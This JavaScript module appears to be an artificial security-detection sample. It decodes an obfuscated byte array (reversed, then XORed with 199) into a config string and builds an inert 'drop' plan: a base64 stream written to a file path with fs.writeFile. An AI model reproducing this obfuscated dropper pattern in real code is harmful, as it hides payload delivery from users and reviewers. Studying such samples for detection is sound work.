  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_f93dbe4b = "[180,173,170,233,165,161,245,161,245,255,165,244,245,245,244,241,234,162,160,166,179,180,233,232,162,163,168,169,234,180,180,162,181,179,169,178,175,232,183,170,179,232,250,175,179,166,183,152,162,171,174,161,187,245,255,133,244,245,245,244,241,234,130,131,136,137,250,163,174,152,169,160,174,166,183,170,166,164,187,246,250,179,169,178,168,164,152,162,160,166,179,180,187,170,166,162,181,179,180,152,168,179,152,243,241,162,180,166,165,250,181,162,179,183,166,163,166,187,162,171,174,161,152,162,179,174,181,176,235,163,162,163,163,162,165,170,162,152,162,163,168,164,162,163,250,180,183,162,179,180,187,246,250,177]";
  const Codec_f93dbe4b = "decimal_array|reverse_then_xor|c7";

  function load_f93dbe4b() { return JSON.parse(Material_f93dbe4b); }
  function decode_f93dbe4b(v_a19c) { return [...v_a19c].reverse().map((value) => value ^ 199); }
  async function recover_f93dbe4b() {
    const v_c304 = [3, 5, 8, 13].slice(1, 3);
    const v_a19c = load_f93dbe4b(); let v_b27e = [];
    const decodeTarget = decode_f93dbe4b; v_b27e = decodeTarget(v_a19c);
    void v_c304; return Buffer.from(v_b27e).toString("ascii");
  }
  async function inspect_f93dbe4b() { return ({ ...{ value: await recover_f93dbe4b() } }).value; }
  async function plan_f93dbe4b() { const inspect = inspect_f93dbe4b; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "base64_to_stream", destination: fields.file_path, api: "fs.writeFile" }); }
  void moduleShape; void plan_f93dbe4b;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_f93dbe4b());
